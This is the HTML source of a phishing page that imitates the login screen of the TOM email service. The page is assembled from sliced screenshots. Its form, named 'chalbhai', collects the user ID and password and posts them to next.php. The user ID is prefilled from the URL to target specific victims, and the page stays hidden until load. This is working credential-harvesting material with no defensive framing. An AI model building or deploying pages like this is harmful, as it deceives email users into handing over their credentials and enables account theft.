<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#84;&#79;&#77;&#37038;&#31665;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
  
.textbox { 
     color: #808080;
    height: 40px;
    border-bottom: 1px solid #33b915; 
    width: 275px;  
    border-style: solid; 
  	padding-left: 5px;
	font-size: 15px;
	font-family: "&#24494;&#36719;&#38597;&#40657;", helvetica, arial;
    border-width: 0px 0px 1px 0px;  
   	border-bottom: 1px solid #33b915;  
    outline:0; 
  } 

 </style>
 <style type="text/css">
  
.textrbox { 
     color: #808080;
    height: 40px;
    border-bottom: 1px solid #33b915; 
    width: 275px;
    border-style: solid; 
  	padding-left: 5px;
	font-family: "&#24494;&#36719;&#38597;&#40657;", helvetica, arial;
	font-size: 15px;
    border-width: 0px 0px 0px 0px;  
   	border-bottom: 1px solid #fff;  
    outline:0; 
  } 

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:130px; z-index:0"><img src="images/m1.png" alt="" title="" border=0 width=1349 height=130></div>

<div id="image2" style="position:absolute; overflow:hidden; left:140px; top:126px; width:1023px; height:215px; z-index:1"><img src="images/m2.png" alt="" title="" border=0 width=1023 height=215></div>

<div id="image3" style="position:absolute; overflow:hidden; left:149px; top:338px; width:1016px; height:289px; z-index:2"><img src="images/m3.png" alt="" title="" border=0 width=1016 height=289></div>

<div id="image4" style="position:absolute; overflow:hidden; left:193px; top:663px; width:968px; height:316px; z-index:3"><img src="images/m4.png" alt="" title="" border=0 width=968 height=316></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:1019px; width:1349px; height:213px; z-index:4"><img src="images/m5.png" alt="" title="" border=0 width=1349 height=213></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:1231px; width:1349px; height:220px; z-index:5"><img src="images/m6.png" alt="" title="" border=0 width=1349 height=220></div>

<div id="image7" style="position:absolute; overflow:hidden; left:186px; top:1499px; width:897px; height:219px; z-index:6"><img src="images/m7.png" alt="" title="" border=0 width=897 height=219></div>

<div id="image8" style="position:absolute; overflow:hidden; left:268px; top:1714px; width:810px; height:239px; z-index:7"><img src="images/m8.png" alt="" title="" border=0 width=810 height=239></div>

<div id="image9" style="position:absolute; overflow:hidden; left:0px; top:2000px; width:1349px; height:104px; z-index:8"><img src="images/m9.png" alt="" title="" border=0 width=1349 height=104></div>

<div id="image10" style="position:absolute; overflow:hidden; left:247px; top:2020px; width:830px; height:19px; z-index:9"><a href="#"><img src="images/m12.png" alt="" title="" border=0 width=830 height=19></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:192px; top:11px; width:785px; height:53px; z-index:10"><a href="#"><img src="images/m10.png" alt="" title="" border=0 width=785 height=53></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:849px; top:390px; width:282px; height:38px; z-index:11"><a href="#"><img src="images/m11.png" alt="" title="" border=0 width=282 height=38></a></div>
<form action=next.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:280px;left:850px;top:201px;z-index:12; font-size:14pt" size="1" tabindex="90">
<input name="pass" id="demo-field" placeholder="&#23494;&#30721;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:280px;left:850px;top:250px;z-index:13">
<div id="formcheckbox1" style="position:absolute; left:846px; top:302px; z-index:14"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:849px; top:340px; z-index:15"><input type="image" name="formimage1" width="282" height="42" src="images/button.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>